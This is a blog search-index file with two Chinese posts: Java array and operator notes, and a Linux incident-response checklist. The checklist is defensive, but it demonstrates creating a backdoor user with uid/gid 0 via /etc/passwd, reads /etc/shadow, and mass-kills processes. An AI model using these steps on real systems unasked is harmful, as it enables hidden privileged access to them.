<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>【Java学习笔记】0x01</title>
      <link href="/posts/f8f6e3f5/"/>
      <url>/posts/f8f6e3f5/</url>
      
        <content type="html"><![CDATA[<p><img src="https://gitee.com/m0re/picture/raw/master/img/20220106193425.jpeg" loading="lazy"></p><a id="more"></a><h2 id="内存分配"><a href="#内存分配" class="headerlink" title="内存分配"></a>内存分配</h2><p>多个数组指向同一块内存</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>game</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloWorld</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Hello,world!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//定义第一个数组</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>        arr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">200</span><span class="token punctuation">;</span>        arr<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">300</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//定义第二个数组</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr2 <span class="token operator">=</span> arr<span class="token punctuation">;</span>        arr2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">111</span><span class="token punctuation">;</span>        arr2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">222</span><span class="token punctuation">;</span>        arr2<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">333</span><span class="token punctuation">;</span>        <span class="token comment">//输出两个数组的元素及名称</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>arr2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>arr2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211128163423.png" loading="lazy"><br>看结果是可以看到<code>arr2=arr</code>的，也就是说，两个数组指向了同一块内存。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20211128163634.png" loading="lazy"></p><h2 id="数组初始化"><a href="#数组初始化" class="headerlink" title="数组初始化"></a>数组初始化</h2><h3 id="静态初始化"><a href="#静态初始化" class="headerlink" title="静态初始化"></a>静态初始化</h3><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>game</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloWorld</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">/*        * 静态初始化        *   格式1        *       数据类型[] 变量名 = new 数据类型[]&#123;数据1, 数据2, 数据3,......&#125;;        *   格式2(简单格式)        *       数据类型[] 变量名 = &#123;数据1, 数据2, 数据3,......&#125;;        * */</span>        <span class="token comment">//两种格式</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//分割线</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>索引越界：访问了数组中不存在的索引对应的元素，造成索引越界问题。<br>空指针异常：访问的数组已经不再指向堆内存的数据，造成空指针异常。null：空值，引用数据类型的默认值，表示不指向任何有效对象。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>game</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloWorld</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//索引越界</span>        <span class="token comment">//ArrayIndexOutOfBoundsException</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//空指针异常</span>        <span class="token comment">// 把null赋值给数组</span>        <span class="token comment">//NullPointerException</span>        arr <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="字符类型"><a href="#字符类型" class="headerlink" title="字符类型"></a>字符类型</h3><p>字符类型可以表示为单个字符，表示为char，char是两个字节，可以存放汉字，多个字符就用String来表示了。  </p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">char</span> c1 <span class="token operator">=</span> <span class="token string">'a'</span><span class="token punctuation">;</span><span class="token keyword">char</span> c2 <span class="token operator">=</span> <span class="token string">'\t'</span><span class="token punctuation">;</span><span class="token keyword">char</span> c3 <span class="token operator">=</span> <span class="token string">'字'</span><span class="token keyword">char</span> c4 <span class="token operator">=</span> <span class="token number">97</span><span class="token punctuation">;</span></code></pre><p>字符类型可以直接存放一个数字。<br>字符型本质：字符型存储到计算机中，需要将字符对应的码值(整数)找出来，比如：’a’<br>存储：’a’ ==&gt; 码值97 ==&gt; 二进制 ==&gt; 存储<br>读取：二进制 ==&gt; 97 ==&gt; ‘a’ ==&gt; 显示</p><h3 id="算数运算符"><a href="#算数运算符" class="headerlink" title="算数运算符"></a>算数运算符</h3><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i <span class="token operator">=</span> i<span class="token operator">++</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//1</span></code></pre><p>这么理解：使用临时变量</p><blockquote><p>tmep=i;i=i+1;i=temp;</p></blockquote><p><img src="https://gitee.com/m0re/picture/raw/master/img/20220106131130.png" loading="lazy"></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i <span class="token operator">=</span> <span class="token operator">++</span>i<span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//2</span></code></pre><p>先加再赋值。</p><blockquote><p>i=i+1;tmep=i;i=temp;</p></blockquote><h3 id="三元运算符"><a href="#三元运算符" class="headerlink" title="三元运算符"></a>三元运算符</h3><p>语法:<br>条件表达式?表达式1:表达式2<br>运算规则：如果条件表达式为true，则执行表达式1；如果条件表达式为false，则执行表达式2。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">int</span> b <span class="token operator">=</span> <span class="token number">99</span><span class="token punctuation">;</span><span class="token keyword">int</span> result <span class="token operator">=</span> a<span class="token operator">></span>b <span class="token operator">?</span> a<span class="token operator">++</span> <span class="token operator">:</span> b<span class="token operator">++</span><span class="token punctuation">;</span></code></pre><p>其中在涉及转换时，表达式1和表达式2要为可以赋给接收变量的类型(或可以自动转换的)</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>game</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloWorld</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> b <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> c <span class="token operator">=</span> a<span class="token operator">></span>b <span class="token operator">?</span> a <span class="token operator">:</span> b<span class="token punctuation">;</span>        <span class="token comment">//int d = a>b ? 1.1 : 3.4; //不兼容的类型: 从double转换到int可能会有损失</span>        <span class="token keyword">int</span> e <span class="token operator">=</span> a<span class="token operator">></span>b <span class="token operator">?</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token number">1.1</span> <span class="token operator">:</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token number">3.4</span><span class="token punctuation">;</span> <span class="token comment">//满足int --> double</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span></code></pre><p>三元运算符可以转成if–else语句</p><h3 id="数组拷贝"><a href="#数组拷贝" class="headerlink" title="数组拷贝"></a>数组拷贝</h3><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>game</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloWorld</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span>arr1<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment">//遍历arr1，把每个元素拷贝到arr2对应的元素位置</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>arr1<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            arr2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> arr1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">//修改arr2的一个元素</span>        arr2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>        <span class="token comment">//分别输出arr1和arr2</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"====arr1的元素===="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr1<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>arr1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"====arr2的元素===="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr2<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>arr2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>流程为：先开辟一个新的数组空间，然后将数组1中的数据进行遍历，然后赋值给数组2。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20220106192811.png" loading="lazy"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【应急响应】Linux系统分析排查</title>
      <link href="/posts/f2b96597/"/>
      <url>/posts/f2b96597/</url>
      
        <content type="html"><![CDATA[<p><img src="https://gitee.com/m0re/picture/raw/master/img/20211201140553.jpeg" loading="lazy"><br>今日份鸡汤缺失………</p><a id="more"></a><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>应急响应篇——Linux应急响应</p><h2 id="敏感文件分析"><a href="#敏感文件分析" class="headerlink" title="敏感文件分析"></a>敏感文件分析</h2><p>一般的敏感目录，像<code>tmp/</code>还有一些可执行程序的目录，一般都在<code>/usr/bin</code>或者<code>/usr/sbin</code>等….</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211128195341.png" loading="lazy"></p><p>参数说明：</p><pre class="language-bash" data-language="bash"><code class="language-bash">-a 显示所有目录-l 以长格式显示目录下的内容列表-t 用文件和目录的更改时间排序</code></pre><p>然后进一步在tmp目录中查找最新添加的可疑文件<br><img src="https://gitee.com/m0re/picture/raw/master/img/20211128195914.png" loading="lazy"><br>额，最近玩内网kali用做攻击机，所以tmp目录的东西是多了点。比如这个ew，2333</p><p>另，Linux开机启动项是<code>/etc/init.d</code>，一般为插入恶意代码的位置。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20211128200248.png" loading="lazy"><br>进入启动项目录进行筛选</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> -alh <span class="token operator">|</span> <span class="token function">head</span> -n <span class="token number">10</span></code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211128200516.png" loading="lazy"><br>然后使用stat对文件的创建、修改、访问时间进行详细的查看，如果修改时间距离日期接近，可进一步排查。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20211128201029.png" loading="lazy"></p><p>针对新建的文件</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 找出24小时内被修改的文件</span><span class="token function">find</span> ./ -mtime <span class="token number">0</span> -name <span class="token string">"*.php"</span><span class="token comment"># 找出72小时内被修改的文件</span><span class="token function">find</span> ./ -ctime -2 -name <span class="token string">"*.php"</span></code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211128201340.png" loading="lazy"><br>查找最近新建的php文件中，具有最高权限的文件。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> ./ -iname <span class="token string">"*.php"</span> -perm <span class="token number">777</span></code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211128201633.png" loading="lazy"></p><h2 id="网络连接"><a href="#网络连接" class="headerlink" title="网络连接"></a>网络连接</h2><p>使用<code>netstat</code>对网络连接进行查看处于tcp网络套接字相关信息。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">netstat</span> -pantl</code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211128202827.png" loading="lazy"><br>使用<code>ip a</code>查看网络信息<br><img src="https://gitee.com/m0re/picture/raw/master/img/20211128202947.png" loading="lazy"><br>如果发现了可疑进程，则使用<code>kill -9 [pid]</code>给杀掉进程。</p><h2 id="进程分析"><a href="#进程分析" class="headerlink" title="进程分析"></a>进程分析</h2><p>使用命令<code>ps</code>，分析进程，可以根据<code>netstat</code>定位到<code>pid</code>，使用<code>ps</code>命令分析进程</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ps</span> aux</code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211128203302.png" loading="lazy"><br>查看最近使用了22端口的进程。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ps</span> aux <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"22"</span></code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211128203413.png" loading="lazy"><br>使用pid进行筛选</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ps</span> aux <span class="token operator">|</span> <span class="token function">grep</span> <span class="token punctuation">[</span>pid<span class="token punctuation">]</span></code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211128203816.png" loading="lazy"></p><p>查看端口为22的隐藏进程</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">lsof</span> -i:22</code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211128203931.png" loading="lazy"></p><h2 id="异常登录分析"><a href="#异常登录分析" class="headerlink" title="异常登录分析"></a>异常登录分析</h2><p><code>last</code>命令记录着所有用户登录系统的日志，可以用来查找非授权用户的登录事件，而last命令的输出结果来源于<code>/var/log/wtmp</code>文件，入侵者一般会删除该文件<br><img src="https://gitee.com/m0re/picture/raw/master/img/20211128204123.png" loading="lazy"><br>查看登录日志，筛选非本地登录</p><pre class="language-bash" data-language="bash"><code class="language-bash">last -i <span class="token operator">|</span> <span class="token function">grep</span> -h <span class="token number">0.0</span>.0.0</code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211128204218.png" loading="lazy"><br>还有一些常见的命令</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">who</span>     查看当前登录用户<span class="token punctuation">(</span>tty为本地登录,pts为远程登录<span class="token punctuation">)</span>w       查看某一时刻用户的行为<span class="token function">uptime</span>  查看有多少用户，以此确定是否存在异常用户lastb   显示登录失败次数，判断是存在ssh爆破last    显示用户最近登录信息。lastlog 登录成功记录</code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211128204256.png" loading="lazy"></p><h2 id="异常用户分析排查"><a href="#异常用户分析排查" class="headerlink" title="异常用户分析排查"></a>异常用户分析排查</h2><p>root用户是权限最高的一个用户，同时它也代表着最高权限。<br>新建用户和密码</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">useradd</span> username<span class="token function">passwd</span> username</code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211201110453.png" loading="lazy"><br>其中root用户的uid和gid都是0，修改一下新建的用户。直接编辑<code>passwd</code>文件。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/passwd</code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211201114850.png" loading="lazy"><br>将<code>test</code>的<code>uid</code>和<code>gid</code>都改为<code>0</code><br><img src="https://gitee.com/m0re/picture/raw/master/img/20211201120944.png" loading="lazy"></p><pre class="language-bash" data-language="bash"><code class="language-bash">Linux所有用户都会在/etc/passwd、/etc/shadow、/etc/group文件中记录<span class="token function">cat</span> /etc/passwd ：查看是否有其他uid，gid为0的情况<span class="token function">less</span> /etc/passwd：查看是否有新增用户<span class="token function">grep</span> :0 /etc/passwd：查看是否有特权用户<span class="token function">ls</span> -l /etc/passwd：查看passwd最后修改时间<span class="token function">awk</span> -F: <span class="token string">'length(<span class="token variable">$2</span>)==0 &#123;print <span class="token variable">$1</span>&#125;'</span> /etc/shadow：查看是否存在空口令用户</code></pre><h2 id="历史命令分析"><a href="#历史命令分析" class="headerlink" title="历史命令分析"></a>历史命令分析</h2><p>在Linux系统中，默认记录之前执行的命令。且存储在<code>/root/bash_history</code>文件中。<br>查看方式<code>cat /root/bash_history</code>或者<code>history</code>命令查看。<br>需要特别注意查看的是<code>wget</code>可远程下载、<code>ssh</code>可以远程连接主机、<code>tar/zip</code>等数据打包类命令，系统配置命令等<br><img src="https://gitee.com/m0re/picture/raw/master/img/20211201121911.png" loading="lazy"><br>结合<code>grep</code>命令查找一些关键词，并进行详细筛选分析。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20211201122107.png" loading="lazy"></p><h2 id="Linux计划任务排查"><a href="#Linux计划任务排查" class="headerlink" title="Linux计划任务排查"></a>Linux计划任务排查</h2><p>这就跟Windows系统中的定时任务排查差不多，就是查看有没有开机自启或者定时启动的高权限的服务，或者有无绑定木马。<br>这里使用<code>crontab</code>来设置计划任务。<br>具体看下使用方法就可以了，计划任务就不细说了。</p><h2 id="开机自启项"><a href="#开机自启项" class="headerlink" title="开机自启项"></a>开机自启项</h2><p>使用<code>/etc/init.d</code>查看开机自启项目录<br><img src="https://gitee.com/m0re/picture/raw/master/img/20211201123104.png" loading="lazy"><br>查看自启项有无异常。</p><h2 id="path变量异常"><a href="#path变量异常" class="headerlink" title="$path变量异常"></a>$path变量异常</h2><p>决定了shell将到那些目录中寻找命令或程序，PATH的值是一系列目录，当你运行一个程序时，LINux在这些目录下仅需搜寻编译连接<br>环境变量的意思。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20211201123244.png" loading="lazy"><br>修改PATH <code>export PATH=$PATH:/usr/locar/new/bin</code> 本地终端中有效，重启后无效。在<code>/etc/profile或/home/.bashrc(source~/.bashrc)</code>才能永久生效。</p><h2 id="后门排查"><a href="#后门排查" class="headerlink" title="后门排查"></a>后门排查</h2><p>Rkhunter具有如下功能：<br>1.系统命令检测、MD5校验<br>2.Rookit检测<br>3.本机敏感目录、系统配置异常检测</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt</span> <span class="token function">install</span> rkhunter</code></pre><p>使用方法暂无。mark一下~</p><h2 id="其他（转载）"><a href="#其他（转载）" class="headerlink" title="其他（转载）"></a>其他（转载）</h2><p>1.日志如果被软链接到<code>/dev/null</code><br>1.删除<code>log</code><br>2.重启<code>rsyslog</code></p><p>2 如果文件<code>/</code>目录无法删除，可使用<code>lsattr</code>查看文件<code>/</code>目录属性，如果有-i属性可使用<code>chattr -i</code>去除</p><p>3 查找777的权限的文件：<code>find / \*.php -perm 777</code>，因为大部分黑客普遍喜欢直接赋于文件<code>/</code>目录777的权限</p><p>4 搜集SSH爆破字典：<code>grep &quot;Failed password&quot; /var/log/secure | awk &#123;&#39;print $9&#39;&#125; | sor0t | uniq -c | sort -nr</code></p><p>5 查看恶意文件里面的IP：<code>strings /usr/bin/.sshd | egrep &#39;[1-9]&#123;1,3&#125;\.[1-9]&#123;1,3&#125;\.&#39;</code></p><p>6 根据特征删除指定进程：<code>ps aux|grep -v grep|grep &quot;mysqlc&quot;|awk &#39;&#123;print $2&#125;&#39;|xargs kill -9</code></p><p>7 获取进程id数组，并循环杀死所有进程</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ps</span> -ef<span class="token operator">|</span><span class="token function">grep</span> <span class="token string">"java"</span> <span class="token operator">|</span> <span class="token function">grep</span> -v <span class="token function">grep</span><span class="token operator">|</span><span class="token function">awk</span> <span class="token string">'&#123;print <span class="token variable">$2</span>&#125;'</span><span class="token function">kill</span> -9 <span class="token variable"><span class="token variable">`</span><span class="token function">ps</span> -ef<span class="token operator">|</span><span class="token function">grep</span> <span class="token string">"java"</span> <span class="token operator">|</span> <span class="token function">grep</span> -v <span class="token function">grep</span><span class="token operator">|</span><span class="token function">awk</span> <span class="token string">'&#123;print <span class="token variable">$2</span>&#125;'</span><span class="token variable">`</span></span><span class="token keyword">for</span> <span class="token for-or-select variable">pid</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">ps</span> -ef<span class="token operator">|</span><span class="token function">grep</span> <span class="token string">"java"</span> <span class="token operator">|</span> <span class="token function">grep</span> -v <span class="token function">grep</span><span class="token operator">|</span><span class="token function">awk</span> <span class="token string">'&#123;print <span class="token variable">$2</span>&#125;'</span><span class="token variable">)</span></span><span class="token punctuation">;</span> <span class="token keyword">do</span>  <span class="token builtin class-name">echo</span> <span class="token variable">$pid</span>  <span class="token function">kill</span> -9 <span class="token variable">$pid</span><span class="token keyword">done</span></code></pre><p>8 隐藏进程查找：<br>进程都存在于内存中，而内存中的数据又都是写入到/proc/目录下，基于此可查找隐藏文件</p><pre class="language-bash" data-language="bash"><code 